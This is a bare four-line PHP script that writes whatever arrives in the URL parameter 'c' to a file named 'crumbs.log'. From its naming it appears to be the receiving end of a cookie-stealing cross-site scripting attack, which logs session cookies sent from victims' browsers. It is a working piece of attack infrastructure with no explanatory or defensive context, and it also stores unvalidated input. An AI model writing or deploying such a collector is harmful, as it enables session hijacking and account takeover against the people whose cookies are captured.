<?php
$myfile = fopen("crumbs.log", "w");
fwrite($myfile, $_GET['c']);
fclose($myfile);

